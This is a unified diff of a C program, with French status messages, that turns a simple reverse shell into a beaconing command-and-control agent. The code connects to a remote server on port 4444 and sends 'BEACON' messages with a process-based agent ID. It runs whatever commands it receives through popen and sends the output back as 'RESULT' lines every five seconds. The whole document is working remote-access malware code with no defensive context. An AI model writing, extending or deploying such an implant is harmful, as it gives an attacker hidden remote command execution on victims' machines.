@@ -4,13 +4,15 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <stdlib.h>
 
-int main() {
-    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == -1) {
-        perror("socket");
-        return 1;
-    }
+int main()
+{
+    char agent_id[32];
+    snprintf(agent_id, sizeof(agent_id), "agent-%d", getpid());
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) { perror("socket"); return 1; }
 
     struct sockaddr_in server;
     server.sin_family = AF_INET;
@@ -18,33 +20,34 @@ int main() {
     server.sin_port = htons(4444);
 
     if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
-        perror("connect");
-        close(sock);
-        return 1;
+        perror("connect"); close(sock); return 1;
     }
 
-    printf("[+] Connecté au serveur !\n");
+    printf("[+] Connecté en tant que %s\n", agent_id);
 
-    char cmd[1024] = {0};
-    char line[1024] = {0};
+    char buf[2048] = {0};
     char output[65536] = {0};
+    char line[1024] = {0};
 
     while (1) {
-        memset(cmd, 0, sizeof(cmd));
-        int n = recv(sock, cmd, sizeof(cmd) - 1, 0);
-        if (n <= 0) {
-            printf("[!] Serveur déconnecté.\n");
-            break;
-        }
-        cmd[n] = '\0';
+        memset(buf, 0, sizeof(buf));
+        snprintf(buf, sizeof(buf), "BEACON %s", agent_id);
+        if (send(sock, buf, strlen(buf), 0) == -1) break;
 
-        if (strcmp(cmd, "exit") == 0)
-            break;
+        memset(buf, 0, sizeof(buf));
+        int n = recv(sock, buf, sizeof(buf) - 1, 0);
+        if (n <= 0) break;
+        buf[n] = '\0';
+
+        if (strcmp(buf, "NONE") == 0) {
+            sleep(5);
+            continue;
+        }
 
         memset(output, 0, sizeof(output));
-        FILE *fp = popen(cmd, "r");
+        FILE *fp = popen(buf, "r");
         if (fp == NULL) {
-            snprintf(output, sizeof(output), "[!] Impossible d'exécuter la commande.\n");
+            snprintf(output, sizeof(output), "[!] Erreur execution\n");
         } else {
             size_t total = 0;
             while (fgets(line, sizeof(line), fp) != NULL) {
@@ -57,10 +60,11 @@ int main() {
             pclose(fp);
         }
 
-        if (send(sock, output, strlen(output), 0) == -1) {
-            printf("[!] Erreur d'envoi.\n");
-            break;
-        }
+        char result_msg[65536 + 128] = {0};
+        snprintf(result_msg, sizeof(result_msg), "RESULT %s %s", agent_id, output);
+        send(sock, result_msg, strlen(result_msg), 0);
+
+        sleep(5);
     }
 
     close(sock);
